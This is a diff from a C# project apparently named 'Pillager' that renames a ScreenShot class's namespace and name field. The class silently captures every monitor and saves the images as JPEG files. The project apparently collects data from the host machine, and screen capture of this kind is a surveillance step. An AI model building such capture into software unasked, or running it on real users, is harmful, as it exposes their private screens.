@@ -4,17 +4,17 @@ using System.IO;
 using System.Windows.Forms;
 using Pillager.Helper;
 
-namespace Pillager.Others
+namespace Pillager.SystemInfos
 {
     internal class ScreenShot
     {
-        public static string OtherName = "ScreenShot";
+        public static string SystemInfoName = "ScreenShot";
 
         public static void Save(string path)
         {
             try
             {
-                string savepath = Path.Combine(path, OtherName);
+                string savepath = Path.Combine(path, SystemInfoName);
                 try
                 {
                     Native.SetProcessDPIAware();
@@ -32,7 +32,7 @@ namespace Pillager.Others
                             {
                                 graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
                             }
-                            bitmap.Save(Path.Combine(savepath, OtherName + i + ".jpg"), ImageFormat.Jpeg);
+                            bitmap.Save(Path.Combine(savepath, SystemInfoName + i + ".jpg"), ImageFormat.Jpeg);
                         }
                     }
                 }
